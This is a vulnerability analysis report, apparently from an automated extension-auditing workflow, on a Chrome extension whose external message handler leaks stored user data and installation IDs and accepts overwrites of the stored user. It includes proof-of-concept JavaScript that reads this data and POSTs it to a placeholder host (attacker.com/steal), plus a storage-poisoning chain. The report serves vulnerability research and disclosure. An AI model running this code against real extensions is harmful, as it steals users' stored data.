# CoCo Analysis: fagkajglcbohimamlhcpghddiogkfcae

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 3
  - 2x storage_local_get_source → sendResponseExternal_sink
  - 1x bg_chrome_runtime_MessageExternal → chrome_storage_local_set_sink

---

## Sink 1: storage_local_get_source → sendResponseExternal_sink (getUser)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/fagkajglcbohimamlhcpghddiogkfcae/opgen_generated_files/bg.js
Line 965 (minified code showing the flow: chrome.storage.local.get("user") → sendResponse with e.user)

**Code Flow:**

```javascript
// Line 965 (deobfuscated)
const messageHandler = (e, r, t) => {
  try {
    // Flow 1: getUser message
    if ("getUser" === e.message) {
      chrome.storage.local.get("user", (storageData) => {
        if (chrome.runtime.lastError) throw new Error(chrome.runtime.lastError);
        t({message: "success", payload: storageData.user}); // ← storage data sent to external caller
      });
    }

    // Flow 2: getInstallationId message
    if ("getInstallationId" === e.message) {
      chrome.storage.local.get("installationId", (storageData) => {
        if (chrome.runtime.lastError) throw new Error(chrome.runtime.lastError);
        t({message: "success", payload: storageData.installationId}); // ← storage data sent to external caller
      });
    }

    // Flow 3: setUser message (storage poisoning)
    if ("setUser" === e.message) {
      chrome.storage.local.set({user: e.payload}, () => { // ← attacker-controlled data written to storage
        if (chrome.runtime.lastError) throw new Error(chrome.runtime.lastError);
        t({message: "success", payload: e.payload});
      });
    }
  } catch(e) {
    t({message: "fail"});
  }
};

// Both internal and EXTERNAL messages use the same handler
chrome.runtime.onMessage.addListener((e, r, t) => {
  if (!chrome.runtime.lastError) return messageHandler(e, 0, t), true;
  console.error(chrome.runtime.lastError);
});

chrome.runtime.onMessageExternal.addListener((e, r, t) => { // ← External attacker entry point
  if (!chrome.runtime.lastError) return messageHandler(e, 0, t), true;
  console.error(chrome.runtime.lastError);
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External Messages (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// Attack 1: Information Disclosure - Read user data from storage
chrome.runtime.sendMessage(
  "fagkajglcbohimamlhcpghddiogkfcae", // Extension ID
  {message: "getUser"},
  (response) => {
    console.log("Stolen user data:", response.payload);
    // Exfiltrate to attacker server
    fetch("https://attacker.com/steal", {
      method: "POST",
      body: JSON.stringify(response.payload)
    });
  }
);

// Attack 2: Information Disclosure - Read installationId
chrome.runtime.sendMessage(
  "fagkajglcbohimamlhcpghddiogkfcae",
  {message: "getInstallationId"},
  (response) => {
    console.log("Stolen installationId:", response.payload);
  }
);

// Attack 3: Complete Storage Exploitation Chain - Write malicious data and read it back
// Step 1: Poison storage with malicious user data
chrome.runtime.sendMessage(
  "fagkajglcbohimamlhcpghddiogkfcae",
  {
    message: "setUser",
    payload: {
      email: "attacker@evil.com",
      token: "malicious_token",
      // ... any malicious data
    }
  },
  (response) => {
    console.log("Storage poisoned successfully");

    // Step 2: Read it back to confirm
    chrome.runtime.sendMessage(
      "fagkajglcbohimamlhcpghddiogkfcae",
      {message: "getUser"},
      (response) => {
        console.log("Retrieved poisoned data:", response.payload);
      }
    );
  }
);
```

**Impact:**
1. **Information Disclosure**: External attacker can read sensitive user data and installationId from chrome.storage.local via sendResponse
2. **Complete Storage Exploitation Chain**: External attacker can poison storage with malicious user data via "setUser" message, then retrieve it back via "getUser" message, creating a complete write→read→exfiltration chain

**Note:** The manifest.json has `"externally_connectable": {"matches": ["https://turbonotion.com/*"]}`, which restricts external messaging to only turbonotion.com domain. However, per the methodology, we IGNORE manifest.json restrictions. If even ONE domain can exploit this, it's a TRUE POSITIVE. Additionally, a malicious extension or a compromised turbonotion.com page could exploit these vulnerabilities.
